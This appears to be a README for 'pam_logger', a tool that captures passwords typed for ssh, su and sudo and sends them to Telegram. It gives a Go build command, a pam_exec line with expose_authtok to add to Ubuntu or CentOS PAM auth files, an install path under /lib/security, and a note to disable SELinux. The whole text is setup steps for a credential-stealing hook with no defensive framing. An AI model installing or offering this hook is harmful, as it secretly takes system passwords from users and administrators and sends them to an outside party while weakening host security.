# pam_logger 紀錄ssh su sudo 驗證密碼
log pam password and send in telegram
###
```
go build main.go
```
###
添加額外執行pam_logger

ubuntu添加在/etc/pam.d/common-auth

centos 添加在/etc/pam.d/system-auth

auth optional pam_exec.so quiet expose_authtok /lib/security/pam_logger

###
然後將編譯好的main 改名放置到/lib/security/pam_logger

##部分centos 情況需要關閉selinux
